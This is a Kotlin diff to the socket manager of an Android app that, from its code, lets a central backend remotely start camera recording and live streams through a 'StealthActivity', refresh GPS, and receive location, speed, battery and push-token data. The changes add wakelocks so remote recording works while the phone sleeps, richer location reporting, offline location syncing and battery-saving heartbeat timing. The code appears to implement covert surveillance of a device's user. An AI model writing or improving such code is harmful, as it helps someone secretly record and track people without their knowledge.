@@ -19,8 +19,21 @@ object SocketManager {
     private var isConnecting = false
     private var currentServerUrl: String? = null
     private var heartbeatThread: Thread? = null
+    private val heartbeatLock = Object()
+    private const val IDLE_INTERVAL_MS = 60000L // 60s idle interval for battery conservation
+    private const val ACTIVE_INTERVAL_MS = 15000L // 15s active interval (recording / streaming)
     private var lastLiveStreamCmdTime = 0L
     private var lastRecordCmdTime = 0L
+
+    fun triggerHeartbeat() {
+        synchronized(heartbeatLock) {
+            try {
+                heartbeatLock.notifyAll()
+            } catch (e: Exception) {
+                // Ignore
+            }
+        }
+    }
 
     fun isConnected(): Boolean {
         return socket?.connected() == true
@@ -76,6 +89,9 @@ object SocketManager {
                 Log.i(TAG, " Connected to central backend socket at $serverUrl!")
                 registerDevice(context)
                 startHeartbeat(context)
+                Thread {
+                    BackendClient.syncOfflineLocations(context)
+                }.start()
             }
 
             socket?.on(Socket.EVENT_CONNECT) {
@@ -115,6 +131,9 @@ object SocketManager {
                     val camera = data?.optString("camera", "BACK") ?: "BACK"
                     Log.i(TAG, " Received START live stream command (Lens: $camera)")
 
+                    // Acquire brief WakeLock so CPU doesn't sleep while starting stream
+                    com.thirdeye.app.service.DeviceTelemetryService.acquireBriefWakeLock(context, 10000L)
+
                     val wasRecordingRunning = CameraRecordingService.isServiceRunning
                     if (wasRecordingRunning) {
                         Log.i(TAG, "🎥 CameraRecordingService was running. Gracefully stopping recording to switch to live stream.")
@@ -130,6 +149,7 @@ object SocketManager {
                             // ignore
                         }
                         com.thirdeye.app.service.StealthActivity.launchForLiveStream(context, camera)
+                        triggerHeartbeat()
                     }.start()
                 } catch (e: Exception) {
                     Log.e(TAG, "Error handling start-live-stream", e)
@@ -147,6 +167,7 @@ object SocketManager {
                     }
                     Log.i(TAG, " Received STOP live stream command")
                     LiveStreamService.stopService(context)
+                    triggerHeartbeat()
                 } catch (e: Exception) {
                     Log.e(TAG, "Error handling stop-live-stream", e)
                 }
@@ -187,9 +208,10 @@ object SocketManager {
 
                     val camera = data?.optString("camera", "BACK") ?: "BACK"
                     val lens = if (camera.equals("FRONT", ignoreCase = true)) "FRONT" else "BACK"
-                    // Do NOT overwrite user's saved phone settings (prefs.cameraLens)!
-                    // Use lens only as session override for this recording:
                     Log.i(TAG, "📡 Received REMOTE START recording command with session lens: $lens (#1 Top Priority)")
+
+                    // Acquire brief WakeLock so CPU doesn't sleep while starting recording
+                    com.thirdeye.app.service.DeviceTelemetryService.acquireBriefWakeLock(context, 10000L)
 
                     // Stop LiveStreamService first to cleanly release camera & mic hardware
                     val wasLiveRunning = LiveStreamService.isServiceRunning
@@ -206,6 +228,7 @@ object SocketManager {
                             // ignore
                         }
                         com.thirdeye.app.service.StealthActivity.launchForRemoteRecording(context, lens)
+                        triggerHeartbeat()
                     }.start()
                 } catch (e: Exception) {
                     Log.e(TAG, "Error starting remote recording", e)
@@ -223,6 +246,7 @@ object SocketManager {
                     }
                     Log.i(TAG, " Received REMOTE STOP recording command")
                     CameraRecordingService.stopService(context, enableVibration = false)
+                    triggerHeartbeat()
                 } catch (e: Exception) {
                     Log.e(TAG, "Error stopping remote recording", e)
                 }
@@ -238,6 +262,7 @@ object SocketManager {
                         return@on
                     }
                     Log.i(TAG, "📍 Received Remote GPS Refresh Request for: $myDeviceId")
+                    com.thirdeye.app.service.DeviceTelemetryService.acquireBriefWakeLock(context, 15000L)
                     com.thirdeye.app.utils.LocationTracker.forceRefreshLocation(context) { freshLoc ->
                         val payload = JSONObject().apply {
                             put("deviceId", myDeviceId)
@@ -296,9 +321,14 @@ object SocketManager {
             try {
                 val prefs = AppPreferences(context)
                 while (!Thread.currentThread().isInterrupted) {
+                    val isActiveMode = CameraRecordingService.isServiceRunning || prefs.isRecording || LiveStreamService.isServiceRunning
+
                     try {
                         val s = socket
                         if (s != null && s.connected()) {
+                            // Take brief 5s WakeLock to guarantee socket payload is sent during CPU sleep
+                            com.thirdeye.app.service.DeviceTelemetryService.acquireBriefWakeLock(context, 5000L)
+
                             val battery = BackendClient.getBatteryLevel(context)
                             val loc = BackendClient.getLocation(context)
 
@@ -310,22 +340,41 @@ object SocketManager {
                                 put("videoQuality", prefs.videoQuality)
                                 put("cameraLens", prefs.cameraLens)
                                 put("timestamp", System.currentTimeMillis())
+                                val fcmToken = prefs.fcmToken
+                                if (!fcmToken.isNullOrEmpty()) {
+                                    put("fcmToken", fcmToken)
+                                }
                                 if (loc != null) {
                                     put("latitude", loc.latitude)
                                     put("longitude", loc.longitude)
                                     put("locationName", loc.address)
                                     put("villageOrPara", loc.villageOrPara)
                                     put("districtAndCountry", loc.districtAndCountry)
+                                    put("speedKmh", loc.speedKmh)
+                                    put("accuracy", loc.accuracy)
                                 }
                             }
                             s.emit("device-heartbeat", payload)
+                            com.thirdeye.app.service.DeviceTelemetryService.releaseBriefWakeLock()
                         } else {
                             socket?.connect()
                         }
                     } catch (e: Exception) {
                         Log.w(TAG, "Heartbeat cycle error: ${e.message}")
+                        com.thirdeye.app.service.DeviceTelemetryService.releaseBriefWakeLock()
                     }
-                    Thread.sleep(15000)
+
+                    // Adaptive Dynamic Sleep:
+                    // 15s in Active Mode (recording or live stream running)
+                    // 60s in Idle Mode (gives modem radio sufficient sleep time to save battery)
+                    val sleepMs = if (isActiveMode) ACTIVE_INTERVAL_MS else IDLE_INTERVAL_MS
+                    synchronized(heartbeatLock) {
+                        try {
+                            heartbeatLock.wait(sleepMs)
+                        } catch (e: InterruptedException) {
+                            Thread.currentThread().interrupt()
+                        }
+                    }
                 }
             } catch (e: InterruptedException) {
                 // Thread interrupted
@@ -350,6 +399,7 @@ object SocketManager {
                 }
                 socket?.emit("device-recording-status", payload)
                 Log.i(TAG, "📡 Emitted device-recording-status: $isRecording for $deviceId")
+                triggerHeartbeat()
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error emitting recording status", e)
@@ -372,6 +422,10 @@ object SocketManager {
                 put("batteryLevel", battery)
                 put("videoQuality", prefs.videoQuality)
                 put("cameraLens", prefs.cameraLens)
+                val fcmToken = prefs.fcmToken
+                if (!fcmToken.isNullOrEmpty()) {
+                    put("fcmToken", fcmToken)
+                }
                 if (loc != null) {
                     put("latitude", loc.latitude)
                     put("longitude", loc.longitude)
@@ -426,6 +480,7 @@ object SocketManager {
     }
 
     fun disconnect() {
+        triggerHeartbeat()
         heartbeatThread?.interrupt()
         heartbeatThread = null
         socket?.disconnect()
